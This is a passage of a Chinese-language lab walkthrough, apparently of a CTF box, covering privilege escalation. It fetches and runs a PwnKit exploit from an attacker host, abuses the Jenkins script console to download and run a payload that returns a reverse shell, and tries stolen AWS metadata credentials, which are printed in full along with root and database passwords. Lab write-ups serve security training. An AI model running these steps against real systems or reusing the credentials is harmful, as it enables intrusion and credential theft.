2020-08-03 01:41:20,820 - cc_set_passwords.py[DEBUG]: Restarted the SSH daemon.
2020-08-03T01:52:15.709459Z 0 [Note] Shutting down plugin 'sha256_password'
2020-08-03T01:52:15.709469Z 0 [Note] Shutting down plugin 'mysql_native_password'
2020-08-03T01:52:18.263705Z 0 [Note] Shutting down plugin 'sha256_password'
2020-08-03T01:52:18.263709Z 0 [Note] Shutting down plugin 'mysql_native_password'
2020-08-03T02:04:30.632450Z 0 [Note] Shutting down plugin 'sha256_password'
2020-08-03T02:04:30.632454Z 0 [Note] Shutting down plugin 'mysql_native_password'
2020-08-03T02:41:25.099008Z 0 [Note] Shutting down plugin 'sha256_password'
2020-08-03T02:41:25.099012Z 0 [Note] Shutting down plugin 'mysql_native_password'
2020-08-03T03:10:35.563977Z 0 [Note] Shutting down plugin 'sha256_password'
2020-08-03T03:10:35.563982Z 0 [Note] Shutting down plugin 'mysql_native_password'
2020-08-03T03:13:28.570530Z 0 [Note] Shutting down plugin 'sha256_password'
2020-08-03T03:13:28.570534Z 0 [Note] Shutting down plugin 'mysql_native_password'
2020-08-03T03:34:39.760632Z 0 [Note] Shutting down plugin 'sha256_password'
2020-08-03T03:34:39.760636Z 0 [Note] Shutting down plugin 'mysql_native_password'
2020-08-03T12:54:47.597597Z 0 [Note] Shutting down plugin 'sha256_password'
2020-08-03T12:54:47.597609Z 0 [Note] Shutting down plugin 'mysql_native_password'
2020-08-03T12:58:17.306319Z 2 [Note] Access denied for user 'phpmyadmin'@'localhost' (using password: YES)
2020-08-03T12:58:17.339674Z 4 [Note] Access denied for user 'phpmyadmin'@'localhost' (using password: YES)
2020-08-03T13:24:52.582022Z 0 [Note] Shutting down plugin 'sha256_password'
2020-08-03T13:24:52.582026Z 0 [Note] Shutting down plugin 'mysql_native_password'
2020-08-03T18:48:26.583668Z 0 [Note] Shutting down plugin 'sha256_password'
2020-08-03T18:48:26.583672Z 0 [Note] Shutting down plugin 'mysql_native_password'
2020-08-03T19:25:43.394981Z 0 [Note] Shutting down plugin 'sha256_password'
2020-08-03T19:25:43.394984Z 0 [Note] Shutting down plugin 'mysql_native_password'
2020-08-03T19:44:53.685726Z 0 [Note] Shutting down plugin 'sha256_password'
2020-08-03T19:44:53.685730Z 0 [Note] Shutting down plugin 'mysql_native_password'
2020-08-03T20:03:24.819057Z 0 [Note] Shutting down plugin 'sha256_password'
2020-08-03T20:03:24.819061Z 0 [Note] Shutting down plugin 'mysql_native_password'
2020-08-09T17:06:05.618172Z 0 [Note] Shutting down plugin 'sha256_password'
2020-08-09T17:06:05.618176Z 0 [Note] Shutting down plugin 'mysql_native_password'
2024-01-20T18:27:24.064302Z 81 [Note] Access denied for user '1'@'localhost' (using password: YES)
2024-01-20T18:28:29.208523Z 101 [Note] Access denied for user '1'@'localhost' (using password: YES)
2024-01-20T18:28:29.397363Z 103 [Note] Access denied for user 'g4VL3Bna'@'localhost' (using password: YES)
2024-01-20T18:28:29.613430Z 106 [Note] Access denied for user '1'@'localhost' (using password: YES)
2024-01-20T18:28:30.087245Z 111 [Note] Access denied for user '1'@'localhost' (using password: YES)



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r'
```

# 提权

## 提权-内核漏洞

```shell
www-data@internal:/tmp$ wget -O 1.py http://10.8.2.147:9981/CVE-2021-4034.py
wget -O 1.py http://10.8.2.147:9981/CVE-2021-4034.py
--2024-01-20 21:06:33--  http://10.8.2.147:9981/CVE-2021-4034.py
Connecting to 10.8.2.147:9981... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3262 (3.2K) [text/plain]
Saving to: '1.py'

1.py                100%[===================>]   3.19K  --.-KB/s    in 0.02s

2024-01-20 21:06:33 (156 KB/s) - '1.py' saved [3262/3262]

www-data@internal:/tmp$ python3 1.py
python3 1.py
[+] Creating shared library for exploit code.
[+] Calling execve()
# whoami
whoami
root
```

## 提权-AK

貌似可以通过 AK 进行云上提权，但是我没有成功

```shell
EC2 Security Credentials
{
  "Code" : "Success",
  "LastUpdated" : "2024-01-20T20:03:32Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA2YR2KKQM23QQGV5N",
  "SecretAccessKey" : "Bt9qx73nRHDyutVrvx5luBSmcslCI3fDxr2a4VA5",
  "Token" : "IQoJb3JpZ2luX2VjEHEaCWV1LXdlc3QtMSJGMEQCIHsdIGu9bIzbKbD42DJKWbo8AsPjDbnvujIWp0rFaOUWAiBgyFPuEx6PK66E5Lk7J3/OD6gi68WcSAmwmwo9h01TEyrGBAgqEAMaDDczOTkzMDQyODQ0MSIMUYO+uEPViqkO2iUVKqMESu5RxRGFMaCroExhQ+jNspmDVHiQHzxDXfkHXePTySnw2i8ah4LKxX+jMU16WODzPDS/48GBpCOPEBDOxU35XrBXCGbXdUn6X6jJCRltYTm3CI88WFVUy+2fe4X1bl0F0rRSnVhryZsGz2gdXxMVL5W6KP11rlha2tvfLbq91IcM6s5v7hHr50cBHYjQP56oWA/pHycUWpBrO4mqrw1a/kjEFZeoN6nhlhpvgpOpDhfLg+Nw/ExxJsqbsh/+KezfeOcvWIgI4lqW0UkEesGk2+e+zVtC+nXKwojpxhywbD0TZwdWF8sWUZhexvqeBmq6ngCuEx4stoyi/CoDfHkPyvorBvUsJdfopIBNWoF7z77HlHtVLLRkvBgAvkjXdKqFvji9/fs26rJQKHlTBoKIvzpo3uYKFMSQzWI6d25BRuv+yc8mYpCg7owQTy0FFUSzfy6D5RNh7AvkEYQBaFnn3Mn/bLXB8PNnN+oh0Ws5q2no3SsnYiIWm+iLSyGTyRJMBVkAix9z/9ydxu2eSOqJZ4h8CgymomOnceXAPGy3s+1i816mXQHrOyITgBVkLg0AUMpazcRb5oQEKxF4rSG+TSdiL+YefZnygVRl6ZOIxPj3sgr1mzOAhaFnFKRqlzuQ9bEvPvVqg03vRhQ+v11akMHehAiBNrJ6FiEkvMArulQErJletuqCZtsS1KKoV1qb70bTFBqP8vQbipGwY74jgoBigTCls7OtBjqUAnnw49UMdrNXiPxuz5oFKGrr6GnDNQ1+vWThHRzo/jlukPmvZDehdA3A/vG1lT00Atykktq4iflG2QYQ/GUUNKSx1zI2q4eFMdfP0S3y1fHPlg76D4TYKmGt2+SQiqJZXL8pjSNy74TYqp1M5/y/OGwHw1/9FLIul1wfH3+qAHiThuJfO2VWv0hUApYc3mCwBZb5CxEvmavatzG4bP1lq8AWblwTdPB2QXPj7Xbg64DsA++01XUcrHFgYI/46ebD/7J7ZmPDnLkK5NRtmCMYfRMh9Xv/OWlOV9+8eA86r93LGKDBdJPHVR+Iz88A//hkfX2Y5B/T6BMNIRpUSasLV1ZDdM5ZzbdE75YSHvvEfgHRIEjvXg==",
  "Expiration" : "2024-01-21T02:23:00Z"
}

┌──(kali㉿kali)-[~/Desktop]
└─$ ./cf config
? 选择您要设置的云服务商 (Select a cloud provider):  AWS (Amazon Web Services)
? 输入访问密钥备注 (Input Access Key Alias) (必须 Required): 1
? 输入临时凭证的 Token (Input STS Token) (可选 Optional) [IQ******************30hg==] : IQoJb3JpZ2luX2VjEHEaCWV1LXdlc3QtMSJGMEQCIHsdIGu9bIzbKbD42DJKWbo8AsPjDbnvujIWp0rFaOUWAiBgyFPuEx6PK66E5Lk7J3/OD6gi68WcSAmwmwo9h01TEyrGBAgqEAMaDDczOTkzMDQyODQ0MSIMUYO+uEPViqkO2iUVKqMESu5RxRGFMaCroExhQ+jNspmDVHiQHzxDXfkHXePTySnw2i8ah4LKxX+jMU16WODzPDS/48GBpCOPEBDOxU35XrBXCGbXdUn6X6jJCRltYTm3CI88WFVUy+2fe4X1bl0F0rRSnVhryZsGz2gdXxMVL5W6KP11rlha2tvfLbq91IcM6s5v7hHr50cBHYjQP56oWA/pHycUWpBrO4mqrw1a/kjEFZeoN6nhlhpvgpOpDhfLg+Nw/ExxJsqbsh/+KezfeOcvWIgI4lqW0UkEesGk2+e+zVtC+nXKwojpxhywbD0TZwdWF8sWUZhexvqeBmq6ngCuEx4stoyi/CoDfHkPyvorBvUsJdfopIBNWoF7z77HlHtVLLRkvBgAvkjXdKqFvji9/fs26rJQKHlTBoKIvzpo3uYKFMSQzWI6d25BRuv+yc8mYpCg7owQTy0FFUSzfy6D5RNh7AvkEYQBaFnn3Mn/bLXB8PNnN+oh0Ws5q2no3SsnYiIWm+iLSyGTyRJMBVkAix9z/9ydxu2eSOqJZ4h8CgymomOnceXAPGy3s+1i816mXQHrOyITgBVkLg0AUMpazcRb5oQEKxF4rSG+TSdiL+YefZnygVRl6ZOIxPj3sgr1mzOAhaFnFKRqlzuQ9bEvPvVqg03vRhQ+v11akMHehAiBNrJ6FiEkvMArulQErJletuqCZtsS1KKoV1qb70bTFBqP8vQbipGwY74jgoBigTCls7OtBjqUAnnw49UMdrNXiPxuz5oFKGrr6GnDNQ1+vWThHRzo/jlukPmvZDehdA3A/vG1lT00Atykktq4iflG2QYQ/GUUNKSx1zI2q4eFMdfP0S3y1fHPlg76D4TYKmGt2+SQiqJZXL8pjSNy74TYqp1M5/y/OGwHw1/9FLIul1wfH3+qAHiThuJfO2VWv0hUApYc3mCwBZb5CxEvmavatzG4bP1lq8AWblwTdPB2QXPj7Xbg64DsA++01XUcrHFgYI/46ebD/7J7ZmPDnLkK5NRtmCMYfRMh9Xv/OWlOV9+8eA86r93LGKDBdJPHVR+Iz88A//hkfX2Y5B/T6BMNIRpUSasLV1ZDdM5ZzbdE75YSHvvEfgHRIEjvXg==
[2024-01-21 03:55:28]  WARN 检测到当前配置的访问凭证可能处于不可用的状态 (Detection indicates that the currently configured access credentials may be in an unavailable state.)
[2024-01-21 03:55:28]  INFO AS******************QQGV5N 访问密钥配置完成 (AS******************QQGV5N Access Key configuration complete.)

┌──(kali㉿kali)-[~/Desktop]
└─$ ./cf aws ec2 ls
[2024-01-21 03:55:37] ERROR AuthFailure: AWS was not able to validate the provided access credentials
        status code: 401, request id: b9183f74-a344-4ff7-8834-2ebbc74c821e
[2024-01-21 03:55:37]  INFO 未发现 EC2 资源，可能是因为当前访问密钥权限不够 (No EC2 instances found, Probably because the current Access Key do not have enough permissions)

```

## 提权-Jenkins

SSH 端口转发

```shell
ssh -L 8080:172.17.0.2:8080 -CfgN aubreanna@10.10.202.241
```

后台 getshell，路径`xx.xx.xx.xx/script`

```shell
println "id".execute().text
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)

println "wget http://10.8.2.147/123.py -P /tmp/".execute().text

println "python /tmp/123.py".execute().text
# cd C:\Users\Users\Desktop\常用漏洞检测工具\内网\内网穿透\netcat-1.11
```

```shell
C:\Users\Users\Desktop\常用漏洞检测工具\内网\内网穿透\netcat-1.11
# nc.exe -lvvp 4455
listening on [any] 4455 ...
10.10.205.138: inverse host lookup failed: h_errno 11004: NO_DATA
connect to [10.8.2.147] from (UNKNOWN) [10.10.205.138] 40298: NO_DATA
/bin/sh: 0: can't access tty; job control turned off
$ /bin/bash -i
bash: cannot set terminal process group (6): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@jenkins:/$ cd /opt
cd /opt
jenkins@jenkins:/opt$ ls
ls
note.txt
jenkins@jenkins:/opt$ cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you
need access to the root user account.

root:tr0ub13guM!@#123
```

## 提权-Mysql

通过获取到的 wordpress 数据库的账号密码，或许可以通过 phpmyadmin 进行提权

```shell
-rw-r--r-- 1 root root 3109 Aug  3  2020 /var/www/html/wordpress/wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'wordpress123' );
define( 'DB_HOST', 'localhost' );
```

但是 wordpress 用户权限极低，无法使用 UDF 进行提权

```shell
select version();
5.7.31-0ubuntu0.18.04.1

show variables like '%plugin%'
plugin_dir	/usr/lib/mysql/plugin/

select @@basedir
/usr/
```


